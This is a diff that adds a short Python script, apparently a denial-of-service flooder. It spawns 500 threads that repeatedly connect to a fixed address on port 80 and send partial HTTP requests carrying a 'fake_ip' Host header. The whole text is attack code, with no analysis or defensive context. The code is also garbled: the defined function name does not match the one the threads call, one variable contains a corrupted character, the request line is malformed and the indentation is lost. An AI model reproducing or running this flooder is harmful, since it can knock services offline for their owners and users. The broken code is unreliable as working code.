@@ -1,0 +1,23 @@
+import socket 
+import threading 
+target = '10.0.0.138' 
+fake_ip = '172.16.5.154' 
+port = 80 
+attack_num = 0 
+def atack(): 
+ global attack_num
+ while True: 
+ try: 
+ s = socket.socket ( socket.AF_INET , socket.SOCK_STREAM ) 
+ s.connect ( (target , port) ) 
+ s.sendto ( ("GET/HTTP/1.1\r\n").encode ( 'ascii' ) , (target , port) ) 
+ s.sendto ( ("Host: " + fake_ip + "\r\n\r\n").encode ( 'ascii' ) , (target , port) ) 
+ aƩack_num += 1 
+ print ( f"Attack number: {attack_num}" ) 
+ s.close ( ) 
+ except Exception as e: 
+ print ( f"An error occurred: {e}" ) 
+ break 
+for i in range ( 500 ): 
+ thread = threading.Thread ( target = attack )
+ thread.start ( ) 
